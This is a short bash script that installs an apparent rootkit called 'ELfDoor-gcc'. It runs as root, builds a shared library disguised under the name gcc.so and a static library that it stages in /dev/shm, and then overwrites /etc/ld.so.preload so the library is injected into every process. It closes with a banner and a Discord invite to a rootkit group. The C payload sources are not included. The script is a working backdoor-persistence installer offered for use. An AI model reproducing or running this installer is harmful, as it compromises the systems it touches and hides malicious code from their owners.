#!/bin/bash

if [ "$(id -u)" -ne 0 ]; then
    echo "This script must be run as root."
    exit 1
fi

# Compile the shared library
gcc -shared -fPIC -o gcc.so main.c -ldl

# Compile b.c to object file
gcc -c b.c -o b.o

# Create static library b.a
ar rcs b.a b.o

# Move the static library to /dev/shm
mv b.a /dev/shm/

# Preload b.a by adding it to ld.so.preload
mv gcc.so /usr/local/share/
echo "/usr/local/share/gcc.so" > /etc/ld.so.preload


echo "[*] ELfDoor-gcc Installed! [*]"
echo "[*] Join in Rootkit Researchers [*]"
echo "[*] https://discord.gg/66N5ZQppU7 [*]"
